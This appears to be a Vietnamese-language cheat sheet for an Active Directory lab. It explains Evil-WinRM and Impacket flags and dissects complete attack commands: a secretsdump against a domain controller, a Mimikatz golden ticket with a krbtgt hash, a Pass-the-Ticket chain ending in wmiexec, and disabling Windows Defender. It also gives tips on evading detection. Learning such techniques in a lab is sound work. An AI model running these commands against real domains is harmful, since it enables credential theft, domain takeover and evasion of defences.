# 🛡️ Từ điển giải nghĩa câu lệnh Lab Active Directory (Red vs Blue)

*Cẩm nang phân tích cú pháp, giải nghĩa tham số (flags) và cơ chế hoạt động của các công cụ chuyên dụng.*

Tài liệu này đóng vai trò như một **Từ điển kỹ thuật (Glossary/Dictionary)** tập trung giải nghĩa chi tiết các tham số phức tạp của các công cụ bảo mật chuyên dụng trong Active Directory. Để tra cứu nhanh các lệnh quản trị hệ điều hành cơ bản, vui lòng tham khảo các cheatsheet tương ứng:
* 🐧 Tra cứu lệnh hệ thống Linux cơ bản tại: [Linux Essentials](#/notebook/linux-base)
* 🪟 Tra cứu lệnh quản trị Windows cơ bản tại: [Windows Essentials](#/notebook/windows-base)

---

## 📖 PHẦN 1: BẢN ĐỒ GIẢI NGHĨA THAM SỐ (FLAGS) CHUYÊN DỤNG

Các ký tự đứng sau dấu gạch ngang (ví dụ: `-i`, `-u`, `-p`, `-H`, `-k`) là các **Tham số (Flags/Arguments)** để điều khiển hành vi của công cụ bảo mật. Dưới đây là phân tích chi tiết:

### 1. Tham số trong Evil-WinRM (Shell quản trị & Tấn công từ xa)
Cú pháp tổng quát: `evil-winrm -i [Target_IP] -u [User] [Option]`

| Tham số | Tên đầy đủ | Giải nghĩa bản chất & Ngữ cảnh sử dụng |
| :--- | :--- | :--- |
| **`-i`** | `Target IP` | Địa chỉ IP của máy mục tiêu. Bắt buộc để thiết lập socket kết nối. |
| **`-u`** | `Username` | Tài khoản muốn dùng để xác thực WinRM. |
| **`-p`** | `Password` | Mật khẩu thô dạng rõ ràng (Cleartext). *Khuyến nghị:* Bọc trong nháy đơn `'mật_khẩu'` để tránh ký tự đặc biệt bị Linux shell diễn giải sai. |
| **`-H`** | `NTLM Hash` | Chuỗi băm mật khẩu NTLM (32 ký tự Hex). Sử dụng cho kỹ thuật **Pass-the-Hash (PtH)** để đăng nhập mà không cần bẻ khóa mật khẩu gốc. *(Lưu ý: Không dùng chung với `-p`)* |
| **`-s`** | `Scripts Path` | Đường dẫn thư mục chứa script PowerShell (.ps1) trên máy Linux của bạn. Evil-WinRM sẽ nạp trực tiếp script từ Linux **thẳng vào bộ nhớ RAM** của Windows, né tránh hoàn toàn cơ chế quét file trên đĩa cứng của Windows Defender. |
| **`-e`** | `Executables` | Thư mục chứa các file thực thi Windows (.exe) trên máy Linux để chạy trực tiếp trên bộ nhớ RAM máy mục tiêu mà không cần upload đĩa. |

---

### 2. Tham số trong Bộ công cụ Impacket (Mạng & Di chuyển ngang)
Cú pháp tổng quát: `impacket-[toolname] Domain/User:Pass@Target` hoặc `Domain/User@Target -k -no-pass`

| Tham số | Tên đầy đủ | Giải nghĩa bản chất & Ngữ cảnh sử dụng |
| :--- | :--- | :--- |
| **`-k`** | `Kerberos` | Ép công cụ sử dụng giao thức **Kerberos** thay vì giao thức NTLM mặc định. Bắt buộc khi chạy các kỹ thuật **Pass-the-Ticket (PtT)**. |
| **`-no-pass`** | `No Password` | Báo cho công cụ không yêu cầu mật khẩu thô vì ta sẽ xác thực bằng file vé Kerberos đã nạp sẵn trong bộ nhớ của phiên Linux. |
| **`-dc-ip`** | `Domain Controller IP` | IP của máy chủ KDC/Domain Controller. Cần thiết khi máy tấn công Linux không phân giải được tên miền Windows qua DNS. |
| **`-hashes`** | `LM:NT Hash` | Truyền chuỗi băm thay mật khẩu. Cú pháp: `-hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH` (phần đầu là LM hash trống). |

---

## 🔬 PHẦN 2: BÓC TÁCH CÚ PHÁP CÂU LỆNH PHỨC TẠP (ANATOMY)

### 1. secretsdump (Trích xuất cơ sở dữ liệu AD từ xa)
```bash
impacket-secretsdump AnDLP.local/Administrator:'Matkhausieukho123@'@192.168.174.129
```
* **Giải phẫu cú pháp:**
  * `AnDLP.local/Administrator`: Xác định phạm vi xác thực là Domain `AnDLP.local`, tài khoản đặc quyền `Administrator`.
  * `'Matkhausieukho123@'`: Mật khẩu tài khoản (được bọc nháy đơn an toàn).
  * `@192.168.174.129`: Máy đích (Domain Controller).
* **Cơ chế hoạt động:** Sử dụng quyền quản trị tối cao để gọi hàm API hệ thống Windows nhạy cảm là **DRSUAPI** (Directory Replication Service Remote Protocol) nhằm giả lập một Domain Controller phụ đang đồng bộ dữ liệu. Lệnh này ép DC thật phải truyền bản sao toàn bộ cơ sở dữ liệu người dùng (`NTDS.dit`) chứa NTLM Hashes của cả hệ thống về cho máy tấn công.

---

### 2. Đúc Vé Vàng với Mimikatz (Golden Ticket Attack)
```powershell
.\mimikatz.exe "privilege::debug" "kerberos::golden /domain:AnDLP.local /sid:S-1-5-21-3417954494-1957840465-455922886 /rc4:b320d48c476d8ee41dc9f8ad64d354c2 /user:HackerVip /ticket:golden.kirbi" "exit"
```
* **Giải phẫu cú pháp:**
  * `"privilege::debug"`: Nâng quyền tiến trình Mimikatz lên cấp Debugger, cho phép can thiệp vào tiến trình bảo mật hệ thống `lsass.exe`.
  * `/domain:AnDLP.local`: Tên miền muốn tạo vé giả.
  * `/sid:S-1-5-21-...`: Chuỗi định danh bảo mật của Domain (Domain SID). *(Có thể tra cứu nhanh bằng lệnh `whoami /user` trên Windows)*.
  * `/rc4:b320d48c...`: Khóa NTLM Hash của tài khoản dịch vụ cốt lõi **`krbtgt`**. Đây chính là "chữ ký tối thượng" để ký số lên chiếc vé giả, ép Domain Controller phải tin tưởng chiếc vé này là hợp lệ.
  * `/user:HackerVip`: Tên người dùng giả định (tài khoản này không cần tồn tại trong AD).
  * `/ticket:golden.kirbi`: File lưu vé giả lập đầu ra.
* **Tại sao phải viết trên 1 dòng lệnh?** Khi thực thi Mimikatz qua WinRM (hoặc shell không tương tác), việc mở console Mimikatz thủ công sẽ làm treo phiên làm việc (session freeze). Việc xâu chuỗi các tham số trong dấu ngoặc kép và kết thúc bằng lệnh `"exit"` giúp tự động hóa toàn bộ quá trình đúc vé và trả quyền điều khiển về cho Terminal.

---

### 3. Chuỗi xác thực Pass-the-Ticket (PtT) trên Linux
Sau khi đúc vé vàng `golden.kirbi` trên máy Windows và tải về Linux, quy trình nạp và sử dụng vé được thực hiện qua chuỗi 4 bước logic nghiêm ngặt sau:

#### Bước 1: Chuyển đổi định dạng vé
```bash
~/.local/bin/ticketConverter.py golden.kirbi golden.ccache
```
* **Bản chất:** Chuyển đổi vé Kerberos từ cấu trúc dữ liệu nhạy cảm của hệ điều hành Windows (`.kirbi`) sang cấu trúc dữ liệu chuẩn của các thư viện Kerberos hệ điều hành Unix/Linux (`.ccache`).

#### Bước 2: Phân quyền tệp tin an toàn (OPSEC)
```bash
chmod 600 golden.ccache
```
* **Bản chất:** Thay đổi quyền truy cập tệp tin (Đọc/Ghi) chỉ cho riêng người dùng hiện hành. **Cực kỳ quan trọng:** Nếu quyền file quá mở (ví dụ 644 hoặc 777), thư viện Kerberos của Linux sẽ từ chối nạp vé vì lý do an toàn thông tin (vấn đề bảo vệ credential).

#### Bước 3: Nạp vé vào biến môi trường hệ thống
```bash
export KRB5CCNAME=golden.ccache
```
* **Bản chất:** Định nghĩa biến môi trường `KRB5CCNAME` trong phiên làm việc hiện tại, chỉ đường dẫn cho các công cụ mạng (như impacket) biết nơi lấy vé Kerberos để đi xác thực.

#### Bước 4: Đột kích từ xa qua WMI (Consuming the Ticket)
```bash
impacket-wmiexec -k -no-pass AnDLP.local/HackerVip@WIN-C1KC5PA6GBA.AnDLP.local
```
* **Bản chất:** Xác thực Kerberos từ xa bằng vé (`-k -no-pass`) để chiếm quyền điều khiển Domain Controller mà hoàn toàn không để lại dấu vết của mật khẩu thô trong logs của hệ thống đích.

---

### 4. Tắt Real-time Protection của Windows Defender
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```
* **Cơ chế hoạt động:** Thay đổi cấu hình chính sách bảo mật cục bộ của Windows Defender thông qua API quản trị của PowerShell. Lệnh này tắt ngay lập tức tính năng quét tệp tin thời gian thực.
* **Tác động OPSEC:** Hành động này cực kỳ "ồn ào" và sẽ kích hoạt cảnh báo nguy cấp (Critical Alert) trên các hệ thống giám sát SIEM/EDR chuyên nghiệp. Do đó, chỉ thực hiện trong các bài lab thực hành hoặc khi đã vô hiệu hóa thành công kênh truyền log.
